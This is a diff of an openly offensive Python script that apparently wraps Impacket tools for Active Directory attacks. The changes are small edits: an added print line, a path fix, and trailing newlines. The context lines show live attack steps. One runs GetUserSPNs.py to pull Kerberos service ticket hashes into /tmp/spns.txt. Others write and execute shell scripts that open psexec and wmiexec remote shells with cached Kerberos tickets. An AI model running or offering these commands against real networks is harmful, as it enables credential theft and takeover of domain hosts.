@@ -75,6 +75,7 @@ def kerberoast():
 			
 			print "DC IP %s" % ip
 			print "Domain %s" % domain
+			print "On completion check /tmp/spns.txt for hashes"
 
 			#Execute command for dumping
 			os.system("python /usr/local/bin/GetUserSPNs.py %s/%s:%s -dc-ip %s -request -outputfile /tmp/spns.txt" % (domain,use,pas,ip))
@@ -130,7 +131,7 @@ def ldapdomaindump():
 			print "\nDC IP %s" % ip
 			print "Domain %s" % domain
 			print "Files will be output to /tmp/"
-			print "Tip: from %s try - firefox *.html\n" % (getcwd())
+			print "Tip: from %s try - firefox /tmp/*.html\n" % (getcwd())
 			#Execute command for dumping
 			
 			if os.path.isfile("/usr/local/bin/ldapdomaindump" ):
@@ -262,7 +263,7 @@ def start_psexec_shell():
 	
 	pwned = open("/tmp/ee.sh", "w")
 	pwned.write("export KRB5CCNAME=%s\n" % cachefile)
-	pwned.write("python /usr/local/bin/psexec.py -k -no-pass %s.%s" % (machine_name,domain))
+	pwned.write("python /usr/local/bin/psexec.py -k -no-pass %s.%s\n" % (machine_name,domain))
 	pwned.close()
 
 	os.system("chmod +x /tmp/ee.sh")
@@ -278,7 +279,7 @@ def start_wmiexec_shell():
 	
 	pwned = open("/tmp/hh.sh", "w")
 	pwned.write("export KRB5CCNAME=%s\n" % cachefile)
-	pwned.write("python /usr/local/bin/wmiexec.py -k -no-pass %s.%s" % (machine_name,domain))
+	pwned.write("python /usr/local/bin/wmiexec.py -k -no-pass %s.%s\n" % (machine_name,domain))
 	pwned.close()
 
 	os.system("chmod +x /tmp/hh.sh")
